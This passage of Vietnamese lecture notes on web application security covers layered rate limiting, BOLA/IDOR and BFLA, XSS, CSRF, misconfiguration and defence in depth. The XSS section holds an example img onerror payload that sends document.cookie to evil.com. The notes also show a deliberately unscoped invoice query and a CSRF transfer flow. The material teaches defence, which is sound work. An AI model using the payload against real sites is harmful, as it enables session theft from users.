> Trừ khi hệ thống có yêu cầu mở rộng ngang (horizontal scaling) cực kỳ đặc thù giữa hàng chục microservices không thể chia sẻ cache, **hãy luôn ưu tiên Stateful Sessions dùng Redis**. Các giải pháp khắc phục nhược điểm của JWT rườm rà và biến kiến trúc trở lại gần giống Stateful Session nhưng phức tạp và dễ phát sinh lỗi hơn.

---

## 9. [1:32:41] - Chiến lược Giới hạn Tần suất (Rate Limiting Strategies)

### Tại sao Rate Limiting là bắt buộc?
Nếu không có cơ chế giới hạn tần suất gửi request, hệ thống sẽ đối mặt với 2 nguy cơ hủy diệt:
1. Kẻ tấn công gửi hàng triệu request liên tục để dò quét mật khẩu (Brute-force / Credential Stuffing).
2. Kẻ tấn công làm cạn kiệt tài nguyên máy chủ (CPU, RAM, kết nối DB), khiến ứng dụng bị tê liệt hoàn toàn (Denial of Service - DoS).

### Nguyên tắc cấu hình
- **Authentication Endpoints (`/login`, `/register`, `/forgot-password`):** Phải áp dụng cấu hình giới hạn cực kỳ nghiêm ngặt và khắt khe.
- **Resource Endpoints thông thường:** Có thể nới lỏng giới hạn hơn tùy theo nhu cầu nghiệp vụ của người dùng.

---

### Chiến lược Giới hạn Tần suất Đa tầng (Layered Rate Limiting)

```
[Request Gửi Đến]
       |
       v
+-------------------------------------------------------+
| TẦNG 1: PER-IP RATE LIMITING                          |
| - Giới hạn: 10 lần/phút theo IP                       |
| - Lỗ hổng: Bị vô hiệu hóa bởi Botnet/Rotating Proxy;  |
|   hoặc chặn nhầm mạng chung (NAT, trường đại học).    |
+---------------------------+---------------------------+
                            |
                            v
+-------------------------------------------------------+
| TẦNG 2: PER-ACCOUNT RATE LIMITING                     |
| - Giới hạn: 5 lần đăng nhập sai / 15 phút             |
| - Chống: Tấn công xoay IP nhắm vào 1 tài khoản        |
| - Lỗ hổng: Bị vô hiệu hóa bởi Password Spraying       |
|   (thử 1 pass phổ biến trên hàng ngàn account khác).  |
+---------------------------+---------------------------+
                            |
                            v
+-------------------------------------------------------+
| TẦNG 3: GLOBAL / SYSTEM-WIDE RATE LIMITING            |
| - Giới hạn: Tối đa 100 lần đăng nhập thất bại / phút  |
|   trên toàn bộ hệ thống                               |
| - Hành động: Kích hoạt báo động, bật CAPTCHA diện rộng|
+-------------------------------------------------------+
```

1. **Tầng 1: Per-IP Rate Limiting (Giới hạn theo địa chỉ IP)**
   - Cho phép tối đa $N$ lần thử trên một địa chỉ IP trong khoảng thời gian xác định (ví dụ: 10 lần/phút).
   - *Hạn chế:* Kẻ tấn công có thể dùng botnet, mạng proxy xoay vòng, VPN để thay đổi IP liên tục; hoặc nhiều người dùng hợp lệ trong cùng một công ty/trường học dùng chung một IP mạng ngoài (NAT) sẽ bị chặn nhầm.
2. **Tầng 2: Per-Account Limiting (Khóa theo tài khoản)**
   - Đếm số lần đăng nhập sai trên từng tài khoản cụ thể (ví dụ: sai 5 lần liên tiếp trong 15 phút sẽ khóa tài khoản trong 24 giờ).
   - Ngăn chặn triệt để tấn công brute-force xoay IP nhắm vào tài khoản mục tiêu.
   - *Hạn chế:* Không chặn được đòn tấn công **Password Spraying** (kẻ tấn công chỉ thử đúng 1 mật khẩu phổ biến như `Password123` trên hàng nghìn tài khoản khác nhau, mỗi tài khoản thử đúng 1 lần).
3. **Tầng 3: Global / System-Wide Rate Limiting (Giới hạn toàn hệ thống)**
   - Giám sát tổng số lần đăng nhập thất bại trên toàn bộ hệ sinh thái backend (ví dụ: tối đa 100 lần thử sai/phút trên toàn hệ thống).
   - Nếu vượt ngưỡng, hệ thống kích hoạt cảnh báo đỏ, tự động chặn dải IP nghi vấn hoặc bật yêu cầu xác thực người thật (CAPTCHA) trên toàn bộ người dùng để bảo vệ máy chủ không bị sập.

---

## 10. [1:37:31] - Lỗ hổng Phân quyền: BOLA & BFLA (Authorization Vulnerabilities)

### Phân biệt rõ ràng: Authentication vs Authorization
- **Authentication (Xác thực):** Trả lời câu hỏi: *"Bạn là ai?"*
- **Authorization (Phân quyền):** Trả lời câu hỏi: *"Sau khi biết bạn là ai, bạn được phép xem hoặc làm những gì trong hệ thống?"*

### Ảo tưởng sai lầm phổ biến của Lập trình viên
Nhiều kỹ sư đặt middleware kiểm tra xác thực ở tầng định tuyến (Routing Layer):
```
Request -> [Router] -> [requireAuth Middleware] -> [Handler] -> [Service] -> [Repository/DB]
```
Sau khi thấy request có token hợp lệ, lập trình viên sinh ra **ảo tưởng an toàn (false sense of security)** rằng người dùng này là người của hệ thống và cho phép họ gọi xuống tầng Database để thao tác bất kỳ tài nguyên nào.

---

### BOLA (Broken Object Level Authorization) / IDOR

#### Cơ chế lỗ hổng
Xảy ra khi hệ thống cho phép người dùng truy cập trực tiếp vào một đối tượng dữ liệu cụ thể (Object) chỉ bằng ID mà **không kiểm tra quyền sở hữu đối tượng đó**.

- **Ví dụ kịch bản:**
  - API lấy chi tiết hóa đơn: `GET /invoices?id=5`
  - Người dùng A chỉ sở hữu hóa đơn số 1 và 2. Nhưng người dùng A sửa ID trên URL thành `id=5`.
  - Câu SQL tại tầng repository:
    ```sql
    -- LỖI BẢO MẬT: Không kiểm tra user_id
    SELECT * FROM invoices WHERE id = 5;
    ```
  - Hệ thống trả về toàn bộ thông tin tài chính của người dùng B! Kẻ tấn công có thể viết một vòng lặp tự động tăng dần ID từ 1 đến 100,000 để tải sạch toàn bộ hóa đơn của mọi khách hàng trong hệ sinh thái.

#### Cách khắc phục triệt để BOLA
Ràng buộc quyền sở hữu tới tận câu truy vấn ở tầng Repository:
```sql
-- CHUẨN XÁC: Luôn kèm điều kiện user_id trích xuất từ Authentication Context
SELECT * FROM invoices WHERE id = $id AND user_id = $context_user_id;
```
> Áp dụng nguyên tắc này cho **TẤT CẢ** các câu lệnh: `SELECT`, `UPDATE`, `DELETE`!

#### Nghệ thuật xử lý mã lỗi HTTP: Tránh rò rỉ thông tin (Information Leakage)

```
             +----------------------------------------------+
             | Nhận Request: Tìm Hóa đơn số 5 của User A    |
             +----------------------+-----------------------+
                                    |
                                    v
+-----------------------------------------------------------------------+
| CÁCH LÀM SAI (RÒ RỈ THÔNG TIN):                                       |
| 1. Query: SELECT * FROM invoices WHERE id = 5                         |
| 2. Thấy hóa đơn 5 TỒN TẠI nhưng thuộc User B                          |
| 3. Trả về: 403 FORBIDDEN                                              |
| -> Kẻ tấn công XÁC NHẬN ĐƯỢC ID 5 tồn tại trong hệ thống!             |
+-----------------------------------------------------------------------+
                                    |
                                    v
+-----------------------------------------------------------------------+
| CÁCH LÀM ĐÚNG (BẢO VỆ DỮ LIỆU TUYỆT ĐỐI):                             |
| 1. Query: SELECT * FROM invoices WHERE id = 5 AND user_id = 'UserA'  |
| 2. DB trả về 0 kết quả (No rows)                                      |
| 3. Trả về: 404 NOT FOUND                                              |
| -> Kẻ tấn công KHÔNG THỂ BIẾT ID 5 không tồn tại hay thuộc người khác!|
+-----------------------------------------------------------------------+
```

- Nếu trả về `403 Forbidden`, bạn đang gián tiếp xác nhận với hacker rằng: *"Tài nguyên này có tồn tại trong hệ thống, chỉ là bạn không có quyền xem thôi"*. Hacker sẽ lợi dụng điều này để quét sạch danh sách ID hợp lệ phục vụ cho các đòn tấn công phi kỹ thuật (Social Engineering).
- Khi trả về `404 Not Found`, hacker hoàn toàn mù tịt thông tin.

#### Sử dụng UUID thay cho Sequential Auto-Increment ID
- Các ID tự tăng tuần tự (1, 2, 3...) cực kỳ nguy hiểm vì dễ đoán và dễ bị enumerate.
- Nên sử dụng **UUID (v4 hoặc v7)** làm khóa chính public cho các tài nguyên. UUID có tính ngẫu nhiên cao, ngăn chặn việc kẻ tấn công đoán được ID tiếp theo.

---

### BFLA (Broken Function Level Authorization)
- **Bản chất:** Thay vì bảo vệ đối tượng dữ liệu (Object), BFLA liên quan đến việc **bảo vệ các chức năng nhạy cảm** (Functions/Endpoints).
- **Ví dụ:** Endpoint quản trị viên: `GET /admin/invoices` (lấy danh sách toàn bộ hóa đơn của cả công ty).
- **Cạm bẫy "Bảo mật bằng sự che giấu" (Security through Obscurity):**
  - Đội ngũ phát triển nghĩ rằng đường dẫn `/admin/invoices` không được công khai trên giao diện người dùng bình thường thì sẽ không ai biết.
  - Tuy nhiên, hacker có thể mở file JavaScript của frontend để dò API endpoint hoặc theo dõi lưu lượng mạng.
  - Nếu backend chỉ kiểm tra user đã đăng nhập mà **quên kiểm tra Role của user có phải là `Admin` hay không**, một thành viên bình thường hoàn toàn có thể gọi trực tiếp endpoint này để đọc toàn bộ dữ liệu hệ thống.
- **Khắc phục:** Bắt buộc phải có middleware kiểm tra vai trò người dùng (Role-Based Access Control - RBAC) tại các route nhạy cảm: `requireRole('admin')`.

---

### Mô hình Tư duy: Tấn công Leo thang Phân quyền (Horizontal vs Vertical)

```
        ^  [VERTICAL ATTACK / BFLA]
        |  (Leo thang đặc quyền theo chiều dọc)
        |  User thường -> Chiếm quyền Chức năng Admin
        |
--------+-------------------------------------------->
        |  [HORIZONTAL ATTACK / BOLA / IDOR]
        |  (Mở rộng phạm vi theo chiều ngang)
        v  User A truy cập trái phép Tài nguyên của User B
```

- **Horizontal Attack (Tấn công leo thang ngang - BOLA/IDOR):** Người dùng A truy cập dữ liệu của người dùng B ở cùng một cấp bậc quyền hạn.
- **Vertical Attack (Tấn công leo thang dọc - BFLA):** Người dùng có quyền thấp (Member) chiếm đoạt chức năng của cấp bậc quyền cao hơn (Admin).

### 4 Nguyên tắc phòng thủ Phân quyền
1. **Centralize Authorization Logic (Tập trung hóa logic phân quyền):** Không viết rải rác các kiểm tra quyền tự phát ở khắp nơi trong codebase; phải gom vào một service/layer quản lý quyền chuẩn hóa.
2. **Default Deny (Mặc định từ chối):** Mọi tài nguyên hoặc endpoint mới thêm vào hệ thống mặc định đều bị khóa truy cập, trừ khi được cấp quyền một cách tường minh.
3. **Automated Authorization Tests:** Viết các bài test tự động chuyên biệt trong CI/CD pipeline để giả lập tình huống User A gọi dữ liệu của User B, Member gọi route của Admin.
4. **Audit Logging:** Ghi log chi tiết mỗi khi có truy cập vào tài nguyên nhạy cảm và mỗi khi có một kiểm tra phân quyền bị thất bại (dấu hiệu của việc hệ thống đang bị rà quét/thăm dò).

---

## 11. [2:17:21] - Tấn công Kịch bản Liên trang: XSS (Cross-Site Scripting)

### Bản chất của XSS
XSS xảy ra khi kẻ tấn công chèn thành công mã JavaScript độc hại vào trang web, và đoạn mã này **được thực thi trực tiếp trên trình duyệt của những người dùng hợp lệ khác** trong ngữ cảnh (context) trang web của bạn.

### Mức độ hủy diệt của JavaScript chạy trong Browser
Nếu script độc hại được thực thi, kẻ tấn công nắm toàn quyền kiểm soát phiên làm việc của nạn nhân:
- Đọc trộm nội dung nhạy cảm hiển thị trên trang web (thông tin cá nhân, số dư tài khoản).
- Đọc token xác thực trong `LocalStorage` hoặc cookie (nếu cookie thiếu cờ `HttpOnly`).
- Gửi các request ngầm tới backend mạo danh người dùng hợp lệ.
- Chuyển hướng người dùng sang các trang đăng nhập giả mạo (Phishing).
- Thay đổi cấu trúc DOM để lừa đảo người dùng bấm vào các nút độc hại.

---

### Phân loại các dạng tấn công XSS
1. **Stored XSS (Persistent XSS):** Mã độc được lưu trữ trực tiếp vào cơ sở dữ liệu (ví dụ: trong phần bình luận, bài viết diễn đàn, tiểu sử profile). Bất kỳ ai truy cập vào trang web để xem nội dung đó đều sẽ bị kích hoạt mã độc.
2. **Reflected XSS:** Mã độc nằm trong URL (query parameters) và được backend phản hồi trả về trực tiếp trong trang HTML mà không được làm sạch.
3. **DOM-based XSS:** Lỗ hổng xảy ra hoàn toàn ở phía client-side khi JavaScript lấy dữ liệu từ một nguồn không an toàn (như `window.location.hash`) rồi ghi trực tiếp vào DOM (qua `innerHTML`).

---

### Ví dụ thực tế: Tính năng Render Markdown sang HTML
Nhiều nền tảng blog/forum cho phép người dùng viết bài bằng Markdown:
- Người dùng nhập cú pháp Markdown $\rightarrow$ Ứng dụng dùng thư viện (như Remark/Rehype) dịch sang HTML $\rightarrow$ Ghi vào DOM để hiển thị.
- Trong React, để chèn HTML thô, lập trình viên phải gọi thuộc tính có tên mang tính cảnh báo:
  ```jsx
  <div dangerouslySetInnerHTML={{ __html: userHtml }} />
  ```
- Nếu kẻ tấn công khéo léo chèn thẻ `<script>` hoặc các thuộc tính kích hoạt sự kiện:
  ```html
  <img src="invalid-image.jpg" onerror="fetch('https://evil.com/steal?c=' + document.cookie)" />
  ```
- Trình duyệt load ảnh lỗi sẽ ngay lập tức kích hoạt sự kiện `onerror` và gửi toàn bộ cookie của nạn nhân về máy chủ của hacker!

### Phòng chống XSS: Làm sạch & Mã hóa (Sanitization & Encoding)
- **Sanitization (Làm sạch HTML):** Luôn sử dụng các thư viện làm sạch chuyên dụng (như `DOMPurify` ở client hoặc các thư viện sanitizer ở backend) để lọc bỏ toàn bộ các thẻ `<script>`, `<iframe>` và các event handlers nguy hiểm (`onload`, `onerror`, `onclick`) trước khi render.
- **Context-aware Encoding:** Mã hóa các ký tự đặc biệt của HTML (`<` thành `&lt;`, `>` thành `&gt;`, `"` thành `&quot;`) để trình duyệt hiểu đó là văn bản hiển thị thuần túy chứ không phải mã lệnh HTML.

---

### Content Security Policy (CSP) - Tấm khiên phòng thủ chiều sâu
- **CSP là gì?** Là một HTTP response header do server trả về nhằm chỉ thị cho trình duyệt biết những loại tài nguyên nào được phép tải và thực thi:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com; object-src 'none';
  ```
- **Tác dụng của CSP:**
  - Cấm hoàn toàn việc thực thi các đoạn mã inline (`<script>alert(1)</script>` hoặc các event handlers `onerror=...`).
  - Chỉ cho phép tải file JavaScript từ các tên miền được định danh tường minh.
  - Hạn chế nguồn tải hình ảnh, font chữ, iframes.
- **Lưu ý cốt lõi:** CSP **KHÔNG PHẢI LÀ GIẢI PHÁP THAY THẾ CHO VIỆC SANITIZE**. CSP đóng vai trò là "chốt chặn cuối cùng" (Defense in Depth) trong trường hợp ứng dụng của bạn vô tình để lọt một lỗi XSS.

---

## 12. [2:28:32] - Tổng quan về CSRF (Cross-Site Request Forgery)

### Cơ chế tấn công CSRF
CSRF lợi dụng cơ chế tự động đính kèm cookie của trình duyệt khi gửi request cross-site:

```
[Nạn nhân đã đăng nhập vào bank.com]
(Trình duyệt đang lưu Cookie xác thực của bank.com)
                       |
                       v
[Nạn nhân vô tình truy cập vào trang độc evil.com]
                       |
                       v
[Trang evil.com tự động chạy mã JavaScript gửi POST request:]
POST https://bank.com/transfer?amount=10000&to=hacker
                       |
                       v
[TRÌNH DUYỆT TỰ ĐỘNG ĐÍNH KÈM COOKIE CỦA bank.com!]
                       |
                       v
[Server bank.com thấy có Cookie hợp lệ -> Thực hiện chuyển tiền!]
```

### Tại sao CSRF không còn là mối đe dọa hàng đầu trong kỷ nguyên hiện đại?
1. **Thuộc tính `SameSite=Lax` trở thành mặc định:** Hầu hết các trình duyệt hiện đại (Chrome, Safari, Firefox, Edge) đều mặc định coi cookie là `SameSite=Lax` nếu lập trình viên không chỉ định. Điều này tự động chặn việc gửi cookie trong các POST request ngầm xuất phát từ trang web khác.
2. **Kiến trúc SPA & Token-based:** Các ứng dụng hiện đại thường sử dụng token gửi qua header `Authorization: Bearer <token>` thay vì dựa dẫm vào cookie tự động gửi của trình duyệt. Trang `evil.com` không có cách nào đọc được token trong header để giả mạo.
3. **Cơ chế CORS (Cross-Origin Resource Sharing):** Ngăn chặn trình duyệt đọc kết quả của các request cross-origin nếu server không cho phép.

---

## 13. [2:33:19] - Lỗ hổng Cấu hình Sai (Security Misconfiguration)

### 1. Quản lý Bí mật (Secrets Management)
- **Sai lầm phổ biến:** Hardcode API keys, mật khẩu cơ sở dữ liệu, JWT secret key vào source code rồi commit lên GitHub / GitLab.
- **Cạm bẫy Git History:** Dù bạn có commit đè một commit mới để xóa secret đi, chuỗi secret đó **VẪN NẰM NGUYÊN VẸN TRONG LỊCH SỬ COMMIT (Git History)**. Bất kỳ ai clone repo đều có thể checkout về commit cũ để lấy cắp.
- **Hành động bắt buộc:** Khi một secret vô tình bị commit vào Git, bạn bắt buộc phải **ROTATE (Hủy bỏ và tạo mới)** secret đó ngay lập tức!
- **Giải pháp chuẩn:** Luôn đưa secret vào biến môi trường (Environment Variables) hoặc các hệ thống quản lý bí mật chuyên dụng (AWS Secrets Manager, AWS Parameter Store, HashiCorp Vault).

### 2. Bật Chế độ Gỡ lỗi (Debug Mode) trên Production
- Ở môi trường Local, chế độ debug ghi lại toàn bộ stack traces, các câu lệnh SQL chi tiết, cấu hình pool DB để tiện phát triển.
- Nhưng nếu để Debug Mode trên môi trường Production:
  - Khi có lỗi phát sinh, server sẽ trả về toàn bộ Stack Trace cho người dùng.
  - Stack trace tiết lộ cấu trúc thư mục, tên file, tên hàm, phiên bản framework, câu lệnh SQL nội bộ. Kẻ tấn công sẽ nắm trọn cấu trúc mã nguồn để lên kịch bản khai thác chính xác.
- **Quy tắc:** Phân định rõ Log Level:
  - Local/Development: `DEBUG`
  - Staging/Production: `INFO`, `WARN` hoặc `ERROR`.
  - Tuyệt đối ẩn toàn bộ stack traces khỏi response trả về cho client trên production (chỉ trả về thông báo lỗi chung chung như `"Internal Server Error"` kèm một `error_id` để tra cứu trong hệ thống log nội bộ).

### 3. Cấu hình các Header Bảo mật HTTP (Security Headers)
Một ứng dụng backend chuẩn mực cần trả về các HTTP headers bảo vệ:
- **`X-Frame-Options: DENY` (hoặc `SAMEORIGIN`):** Ngăn chặn trang web của bạn bị nhúng vào bên trong thẻ `<iframe>` của các trang web lừa đảo. Chống lại cuộc tấn công **Clickjacking** (kẻ gian đặt giao diện web của bạn ẩn dưới một nút bấm trong suốt để lừa người dùng click chuyển tiền hoặc xóa tài khoản).
- **`X-Content-Type-Options: nosniff`:** Ngăn chặn trình duyệt tự ý đoán định dạng MIME (MIME-sniffing), buộc trình duyệt phải tuân thủ đúng `Content-Type` mà server khai báo.
- **`Strict-Transport-Security (HSTS)`:** Ép buộc trình duyệt chỉ được phép giao tiếp với server thông qua giao thức bảo mật HTTPS trong tương lai.
- **Tích hợp thực tế:** Hầu hết các framework đều có middleware chuẩn một dòng để kích hoạt toàn bộ các header này (ví dụ: thư viện `helmet` trong Node.js/Express, middleware security trong Go Gin/Echo hoặc Django).

---

## 14. [2:39:08] - Tư duy Bảo mật & Tài nguyên Học tập (Security Mindset & Resources)

### Triết lý cốt lõi: Ranh giới & Giả định (Boundaries & Assumptions)
Mọi lỗ hổng bảo mật trên thế giới đều bắt nguồn từ một hiện tượng: **Dữ liệu vượt qua ranh giới (Data crossing boundaries)** giữa các hệ thống, giữa các phân quyền, hoặc giữa các ngôn ngữ khác nhau:
- **SQL Injection:** Dữ liệu người dùng vượt qua ranh giới ngôn ngữ vào bộ phân tích cú pháp SQL.
- **Command Injection:** Dữ liệu người dùng vượt qua ranh giới vào trình thông dịch Shell của Hệ điều hành.
- **XSS:** Dữ liệu người dùng vượt qua ranh giới vào cấu trúc DOM/HTML của trình duyệt.
- **BOLA/BFLA:** Dữ liệu vượt qua ranh giới phân quyền giữa người dùng A và người dùng B, hoặc giữa Member và Admin.

### 3 Câu hỏi vàng trước khi viết code (The 3 Golden Questions)
Mỗi khi tiếp nhận dữ liệu và viết code, hãy luôn tự vấn 3 câu hỏi:
1. **Dữ liệu này đang vượt qua những ranh giới nào? (Where is data crossing a boundary?)**
2. **Mình đang đưa ra những giả định gì về dữ liệu này? (What assumptions am I making about this data?)**
3. **Điều gì sẽ xảy ra nếu tất cả những giả định đó hoàn toàn sai lệch hoặc bị cố tình phá vỡ? (What if those assumptions are wrong?)**

---

### Mô hình Phòng thủ Đa tầng (Defense in Depth Framework)

```
+-----------------------------------------------------------------------+
| TẦNG 1: INPUT VALIDATION                                              |
| - Kiểm tra kiểu dữ liệu, độ dài, định dạng regex ngay tại Router/Entry|
+-----------------------------------+-----------------------------------+
                                    |
                                    v
+-----------------------------------------------------------------------+
| TẦNG 2: PARAMETERIZED OPERATIONS                                      |
| - Tách biệt CODE và DATA: Parameterized Queries, Argument Arrays      |
+-----------------------------------+-----------------------------------+
                                    |
                                    v
+-----------------------------------------------------------------------+
| TẦNG 3: AUTHORIZATION AT POINT OF ACCESS                              |
| - Kiểm tra quyền sở hữu tại TẦNG DATABASE (WHERE user_id = $uid)      |
+-----------------------------------+-----------------------------------+
                                    |
                                    v
+-----------------------------------------------------------------------+
| TẦNG 4: SECURITY HEADERS & BROWSER POLICIES                           |
| - Cấu hình CSP, CORS, SameSite, HttpOnly, X-Frame-Options             |
+-----------------------------------+-----------------------------------+
                                    |
                                    v
+-----------------------------------------------------------------------+
| TẦNG 5: MONITORING, AUDIT LOGGING & RATE LIMITING                     |
| - Giới hạn tần suất đa tầng, ghi log phát hiện hành vi rà quét/dò tìm |
+-----------------------------------------------------------------------+
```

Không có một tầng phòng thủ đơn lẻ nào là hoàn hảo. Nếu bạn xây dựng hệ thống phòng thủ theo 5 lớp độc lập này, kẻ tấn công buộc phải vượt qua toàn bộ 5 lớp cùng một lúc mới có thể xâm nhập hệ thống — điều có xác suất xảy ra cực kỳ thấp!

---

### Các tài nguyên học tập chuyên sâu khuyến nghị (Essential Resources)
1. **PortSwigger Web Security Academy (`portswigger.net/web-security`):**
   - Được xây dựng bởi đội ngũ phát triển công cụ thâm nhập mạng nổi tiếng **Burp Suite**.
   - Cung cấp kiến thức toàn diện, chuyên sâu, miễn phí 100% kèm theo hàng trăm phòng Lab thực hành thực tế cho từng loại lỗ hổng: SQL Injection, XSS, CSRF, SSRF, OS Command Injection, JWT Attacks, OAuth vulnerabilities...
2. **OWASP Top 10 (`owasp.org`):**
   - Bảng xếp hạng định kỳ về 10 nhóm rủi ro bảo mật ứng dụng phổ biến và nghiêm trọng nhất trên toàn cầu (Broken Access Control, Cryptographic Failures, Injection, Security Misconfiguration...).
3. **OWASP Cheat Sheet Series:**
   - Cẩm nang tra cứu nhanh các thực hành bảo mật chuẩn công nghiệp cho từng chủ đề chuyên biệt: *Authentication Cheat Sheet*, *Password Storage Cheat Sheet*, *Session Management Cheat Sheet*, *REST Security Cheat Sheet*...
